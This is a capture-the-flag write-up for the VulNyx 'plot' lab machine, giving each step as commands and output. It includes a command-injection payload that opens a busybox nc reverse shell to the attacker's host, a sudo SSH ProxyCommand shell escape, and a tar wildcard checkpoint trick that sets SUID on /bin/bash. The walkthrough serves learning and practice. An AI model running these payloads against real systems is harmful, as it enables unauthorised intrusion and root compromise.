# plot

## Executive Summary

| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| plot | d4t4s3c | Low | VulNyx |

**Summary:** The plot machine began with a stock Apache default page, but a single HTTP response header, `X-Custom-Header: pl0t.nyx`, betrayed the existence of a virtual host. Brute forcing the `Host` header against `*.pl0t.nyx` uncovered a second site, `sar.pl0t.nyx`, a system activity reporter dashboard. The `plot` GET parameter was concatenated directly into a shell command, producing a trivial command injection. Injecting `busybox nc` spawned a reverse shell as `www-data`. Sudo privileges for `www-data` revealed the ability to run `/usr/bin/ssh` as the user `tony`, and abusing SSH's `ProxyCommand` option (the canonical GTFOBins trick) dropped a shell as `tony`. A root cron job was discovered with pspy backing up the web root with `tar -zcf /var/backups/serve.tgz *`. Because the job ran as root with a wildcard, the classic GNU tar checkpoint trick was applied: specially named files (`--checkpoint=1`, `--checkpoint-action=exec=sh shell.sh`) were planted in the web root so that the next backup execution ran `shell.sh` as root, which set the SUID bit on `/bin/bash`. A quick `os.setuid(0)` jump through Python yielded a root shell and both flags.

---

## Reconnaissance

The engagement opened with the standard host discovery sweep and service scans.

1. The target was located at `192.168.56.117`:

```bash
┌──(kali㉿kali)-[~/nyx]
└─$ nmap -sn 192.168.56.0/24         
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-13 20:16 -0400
Nmap scan report for 192.168.56.1 (192.168.56.1)
Host is up (0.00034s latency).
MAC Address: 0A:00:27:00:00:00 (Unknown)
Nmap scan report for 192.168.56.100 (192.168.56.100)
Host is up (0.00056s latency).
MAC Address: 08:00:27:87:C1:A4 (Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.117 (192.168.56.117)
Host is up (0.0010s latency).
MAC Address: 08:00:27:0B:61:12 (Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.104 (192.168.56.104)
Host is up.
Nmap done: 256 IP addresses (4 hosts up) scanned in 6.23 seconds
                                                                                                                      
┌──(kali㉿kali)-[~/nyx]
└─$ ip=192.168.56.117
                                                                                                                      
┌──(kali㉿kali)-[~/nyx]
└─$ nmap -p- -T4 --min-rate=1000 -Pn $ip
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-13 20:17 -0400
Nmap scan report for 192.168.56.117 (192.168.56.117)
Host is up (0.00046s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:0B:61:12 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 4.87 seconds
                                                                                                                      
┌──(kali㉿kali)-[~/nyx]
└─$ nmap -p 22,80 -sC -sV -T4 -Pn $ip   
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-13 20:17 -0400
Nmap scan report for 192.168.56.117 (192.168.56.117)
Host is up (0.00050s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 f0:e6:24:fb:9e:b0:7a:1a:bd:f7:b1:85:23:7f:b1:6f (RSA)
|   256 99:c8:74:31:45:10:58:b0:ce:cc:63:b4:7a:82:57:3d (ECDSA)
|_  256 60:da:3e:31:38:fa:b5:49:ab:48:c3:43:2c:9f:d1:32 (ED25519)
80/tcp open  http    Apache httpd 2.4.56 ((Debian))
|_http-server-header: Apache/2.4.56 (Debian)
|_http-title: Apache2 Debian Default Page: It works
MAC Address: 08:00:27:0B:61:12 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.24 seconds
```

The HTTP service was an Apache default page, but a closer look at the response headers revealed a critical hint for the attack path ahead.

2. The response headers were inspected, and a custom header surfaced:

```bash
┌──(kali㉿kali)-[~/nyx]
└─$ curl -I http://$ip/
HTTP/1.1 200 OK
Date: Fri, 14 Aug 2026 00:35:05 GMT
Server: Apache/2.4.56 (Debian)
X-Custom-Header: pl0t.nyx
Last-Modified: Thu, 03 Aug 2023 14:18:08 GMT
ETag: "29cd-60205730d2279"
Accept-Ranges: bytes
Content-Length: 10701
Vary: Accept-Encoding
Content-Type: text/html
```

The `X-Custom-Header: pl0t.nyx` hinted at a virtual host, so a hosts entry was created to resolve the name:

```bash
┌──(kali㉿kali)-[~/nyx]
└─$ echo "$ip plot.nyx" | sudo tee -a /etc/hosts
192.168.56.117 plot.nyx
```

3. Virtual hosts are often hidden behind different `Host` headers, so ffuf was used to brute force subdomains of `pl0t.nyx`:

```bash
┌──(kali㉿kali)-[~/nyx]
└─$ ffuf -u http://plot.nyx -H "Host: FUZZ.pl0t.nyx" -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -fs 10701

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://plot.nyx
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
 :: Header           : Host: FUZZ.pl0t.nyx
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 10701
________________________________________________

sar                     [Status: 200, Size: 4812, Words: 494, Lines: 87, Duration: 183ms]
:: Progress: [220559/220559] :: Job [1/1] :: 1515 req/sec :: Duration: [0:02:50] :: Errors: 0 ::
```

A single virtual host, `sar.pl0t.nyx`, was found:

```bash
┌──(kali㉿kali)-[~/nyx]
└─$ echo "$ip sar.pl0t.nyx" | sudo tee -a /etc/hosts
192.168.56.117 sar.pl0t.nyx                          
```

---

## Initial Access

### Command Injection in the `plot` Parameter

4. The `sar.pl0t.nyx` site, a system activity reporter dashboard, took a `plot` parameter. A semicolon followed by `id` was injected to test for command execution:

```bash
┌──(kali㉿kali)-[~/nyx]
└─$ curl -s 'http://sar.pl0t.nyx?plot=;id' | grep "uid"
<div style="height:100px; vertical-align: top;"><form METHOD=POST ACTION="index.php"><input type="hidden" name="plot" value=";id"><select class="select_text" name=host onchange="this.form.submit();"><option value=null selected>Select Host</option><option value=HPUX>HPUX</option><option value=Linux>Linux</option><option value=SunOS>SunOS</option><option value=uid=33(www-data) gid=33(www-data) groups=33(www-data)>uid=33(www-data) gid=33(www-data) groups=33(www-data)</option></select></form><form METHOD=POST ACTION="index.php"><input type="hidden" name="plot" value=";id"><input type="hidden" name="host" value=""><select class="select_text" name=sdate onchange="this.form.submit();"><option value=null selected>Select Host First</option></select></form><form METHOD=POST ACTION="index.php"><input type="hidden" name="plot" value=";id"><input type="hidden" name="host" value=""><input type="hidden" name="sdate" value=""><select class="select_text" name=edate onchange="this.form.submit();"><option value=null selected>Select Start Date First</option></select></form></div>   </div>
```

The `plot` value was concatenated into a shell command and the output echoed straight back into the page, confirming command injection as `www-data` (uid 33).

5. The injection was leveraged for a reverse shell. The `plot` parameter was set to spawn a netcat shell back to the attacking machine:

```bash
┌──(kali㉿kali)-[~/nyx]
└─$ curl -G "http://sar.pl0t.nyx/index.php" --data-urlencode "plot=;busybox nc 192.168.56.104 4444 -e busybox sh;"
```

The listener caught the callback:

```bash
┌──(kali㉿kali)-[~/nyx]
└─$ nc -lvnp 4444                    
listening on [any] 4444 ...
connect to [192.168.56.104] from (UNKNOWN) [192.168.56.117] 39542
script -qc /bin/bash
www-data@plot:/var/www/vhost$ ^Z
zsh: suspended  nc -lvnp 4444
                                                                                                                      
┌──(kali㉿kali)-[~/nyx]
└─$ stty raw -echo;fg
[1]  + continued  nc -lvnp 4444

www-data@plot:/var/www/vhost$ export TERM=xterm
www-data@plot:/var/www/vhost$ export SHELL=/bin/bash
```

### Pivoting to `tony` via the Sudo SSH Rule

6. Checking `sudo` privileges for `www-data` revealed a lateral movement path:

```bash
www-data@plot:/var/www/vhost$ sudo -l
Matching Defaults entries for www-data on plot:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on plot:
    (tony) NOPASSWD: /usr/bin/ssh
```

`www-data` could run `/usr/bin/ssh` as `tony` without a password. SSH's `ProxyCommand` option accepts a shell command, which runs on the client side; passing `sh 0<&2 1>&2` gives a shell through the sudo'd SSH process:

```bash
www-data@plot:/var/www/vhost$ sudo -u tony ssh -o ProxyCommand=';sh 0<&2 1>&2' x
```

This dropped an interactive shell as `tony`.

---

## Privilege Escalation

### The Root tar Backup Cron Job

7. Running pspy64 on the target exposed a root cron job backing up the web root:

```bash
2026/08/14 03:16:01 CMD: UID=0     PID=1680   | /bin/sh -c cd /var/www/html && tar -zcf /var/backups/serve.tgz * 
2026/08/14 03:16:01 CMD: UID=0     PID=1681   | tar -zcf /var/backups/serve.tgz index.html 
2026/08/14 03:16:01 CMD: UID=0     PID=1682   | /bin/sh -c gzip 
```

Every minute (by default), root ran `cd /var/www/html && tar -zcf /var/backups/serve.tgz *` against every file in the web root. Because the `*` wildcard expanded to all filenames and tar would process GNU tar option files literally, the classic **tar wildcard** trick applied: files named after tar command-line options would be interpreted as arguments when the wildcard expanded.

8. The web root was inspected to confirm write access and understand the backup job:

```bash
$ ls -la /bin/sh
lrwxrwxrwx 1 root root 4 Jan 15  2023 /bin/sh -> dash
$ ls -la /var/www/html
total 20
drwxrwxrwx 2 www-data www-data  4096 Aug  3  2023 .
drwxr-xr-x 4 www-data www-data  4096 Aug  3  2023 ..
-rw-r--r-- 1 www-data www-data 10701 Aug  3  2023 index.html
$ ls -la /var/backups/serve.tgz
-rw-r--r-- 1 root root 3174 Aug 14 03:17 /var/backups/serve.tgz
```

The `index.html` file in `/var/www/html` was the target for the backup. The checkpoint files were planted there so that, on the next run, tar would execute the payload as root.

9. The payload was staged in the writable web root. A `shell.sh` script was created to set the SUID bit on `/bin/bash`, and two files named after tar's checkpoint options were planted so the wildcard expansion would inject them as tar arguments:

```bash
$ cd /var/www/html
$ echo -e '#!/bin/sh\nchmod +s /bin/bash' > shell.sh
$ chmod +x shell.sh
$ echo "" > "--checkpoint=1"
$ echo "" > "--checkpoint-action=exec=sh shell.sh"
$ ls -la /bin/bash
-rwxr-xr-x 1 root root 1234376 Mar 27  2022 /bin/bash
```

Before the next cron run, `/bin/bash` was still unprivileged.

### The Tar Checkpoint Execution

10. When the cron job fired, tar treated `--checkpoint-action=exec=sh shell.sh` as a real option and executed the script as root, setting the SUID bit on `/bin/bash`:

```bash
$ ls -la /bin/bash
-rwsr-sr-x 1 root root 1234376 Mar 27  2022 /bin/bash
```

11. The SUID `/bin/bash` still dropped privileges on startup, so Python was used to force uid 0 and then spawn a fresh root shell:

```bash
bash-5.1# python3 -c 'import os;os.setuid(0);os.setgid(0);os.system("/bin/bash")' 
root@plot:/var/www/html# su -
root@plot:~# id;whoami;hostname
uid=0(root) gid=0(root) grupos=0(root)
root
plot
```

12. Both flags were read from the root shell:

```bash
root@plot:~# cat /home/tony/user.txt /root/root.txt 
```

The tar checkpoint abuse turned the root backup job into a root shell, and the user and root flags were recovered to complete the compromise.

---

## Attack Chain Summary

1. **Reconnaissance**: A ping sweep isolated the target at `192.168.56.117`, and Nmap exposed SSH on port 22 and Apache on port 80.

2. **Vulnerability Discovery**: The response header `X-Custom-Header: pl0t.nyx` revealed a virtual host. Host-header brute force with ffuf discovered `sar.pl0t.nyx`, a SAR dashboard whose `plot` parameter was concatenated into a shell command, yielding command injection as `www-data`.

3. **Exploitation**: The injection was used to run `busybox nc` for a reverse shell, landing a TTY on the target.

4. **Lateral Movement**: `sudo -l` showed `www-data` could run `/usr/bin/ssh` as `tony` without a password. The GTFOBins `ProxyCommand` trick (`sudo -u tony ssh -o ProxyCommand=';sh 0<&2 1>&2' x`) provided a shell as `tony`.

5. **Privilege Escalation**: pspy revealed a root cron job running `tar -zcf /var/backups/serve.tgz *` in `/var/www/html`. GNU tar checkpoint files (`--checkpoint=1`, `--checkpoint-action=exec=sh shell.sh`) were planted alongside a `shell.sh` payload that set the SUID bit on `/bin/bash`. On the next backup run, the payload executed as root, and the SUID bash was used to obtain a root shell and read both flags.